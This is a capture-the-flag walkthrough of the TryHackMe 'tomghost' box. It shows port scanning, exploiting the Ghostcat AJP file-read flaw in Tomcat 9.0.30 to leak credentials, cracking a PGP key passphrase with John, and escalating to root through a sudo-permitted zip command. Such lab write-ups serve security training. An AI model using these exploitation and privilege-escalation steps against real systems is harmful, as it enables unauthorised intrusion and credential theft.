```bash
# PLATFORM          . THM
# CTF NAME          . tomghost
# DESCRIPTION       . Identify recent vulnerabilities to try exploit the system or read files that you should not have access to.
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/tomghost
```

```bash
sudo nmap -sSVC -T5 10.10.129.164 -p- -oN tomghost
```

```
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 f3c89f0b6ac5fe95540be9e3ba93db7c (RSA)
|   256 dd1a09f59963a3430d2d90d8e3e11fb9 (ECDSA)
|_  256 48d1301b386cc653ea3081805d0cf105 (ED25519)

53/tcp   open  tcpwrapped

8009/tcp open  ajp13      Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS

8080/tcp open  http       Apache Tomcat 9.0.30
|_http-title: Apache Tomcat/9.0.30
|_http-favicon: Apache Tomcat
|_http-open-proxy: Proxy might be redirecting requests
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

- The webserver is running the default installation on Apache Tomcat 9.0.30 and it seems that we don't have access to `/manager` page.

```
By default the Manager is only accessible from a browser running on the same machine as Tomcat. If you wish to modify this restriction, you'll need to edit the Manager's context.xml file. 
```

- I had no idea what AJP is, and after a bit of research, here's what I found.

- AJP is a protocol that allows a standalone webserver (eg: apache) talk to Tomcat. 
  
- This communication, by default, is done on port 8009, which we see it is already open on our target. 

- Tomcat 9.0.30 (what we have installed) can be vulnerable to what's called `Ghostcat` - LFI vulnerability, somewhat restricted, that allows files from a certain path to be pulled. 

- Depending on the server setup, this might be enough to leak credentials or other sensitive information. 

- And here's the exploit: [CVE-2020-1938](https://nvd.nist.gov/vuln/detail/CVE-2020-1938)

- This worked out of the box, except with few code modifications. I had to replace

```python
self.stream = self.socket.makefile("rb", bufsize=0)

with

self.stream = self.socket.makefile("rb")

and 

print("".join([d.data for d in data]))

with 

print("".join([d.data.decode('utf-8') for d in data if d.data]))
```

- After this, I ran the script as `python3 exploit.py IP`

```
Getting resource at ajp13://10.10.129.164:8009/asdf
----------------------------
<?xml version="1.0" encoding="UTF-8"?>
<!--
 Licensed to the Apache Software Foundation (ASF) under one or more
  contributor license agreements.  See the NOTICE file distributed with
  this work for additional information regarding copyright ownership.
  The ASF licenses this file to You under the Apache License, Version 2.0
  (the "License"); you may not use this file except in compliance with
  the License.  You may obtain a copy of the License at

      http://www.apache.org/licenses/LICENSE-2.0

  Unless required by applicable law or agreed to in writing, software
  distributed under the License is distributed on an "AS IS" BASIS,
  WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
  See the License for the specific language governing permissions and
  limitations under the License.
-->
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to GhostCat
	skyfuck:{redacted}
  </description>

</web-app>
```

- We got our credentials :) SSH in to the box.

```
Sorry, user skyfuck may not run sudo on ubuntu.
```

```
skyfuck@ubuntu:~$ ls
credential.pgp  tryhackme.asc
```

- All we had to do is to import the key and decrypt the `.pgp` file.

```
gpg --import tryhackme.asc
gpg --decrypt credential.pgp 
```

- But...

```
You need a passphrase to unlock the secret key for
user: "tryhackme <stuxnet@tryhackme.com>"
```

- We need to call Mr. John for some expertise here, so let's copy the files to our local machine. I've used `scp` from my host

```
scp skyfuck@10.10.129.164:/home/skyfuck/credential.pgp credential.pgp
scp skyfuck@10.10.129.164:/home/skyfuck/tryhackme.asc tryhackme.asc
```

- Then, I've used `/opt/john/run/gpg2john tryhackme.asc > crack`

- And then `/opt/john/run/john crack` ; Passphase is `alexandru`.

- Back to our compromised box, running `pgp --decrypt credential.pgp` reveals the credentials for user `merlin`

```
merlin:{redacted}
```

- Merlin is able to run `/usr/bin/zip` as root.

```
User merlin may run the following commands on ubuntu:
    (root : root) NOPASSWD: /usr/bin/zip
```

- This can be used to spawn a root shell. 

```
TF=$(mktemp -u)
sudo zip $TF /etc/hosts -T -TT 'sh #'
sudo rm $TF
```

- The last flag is in `/root/root.txt`
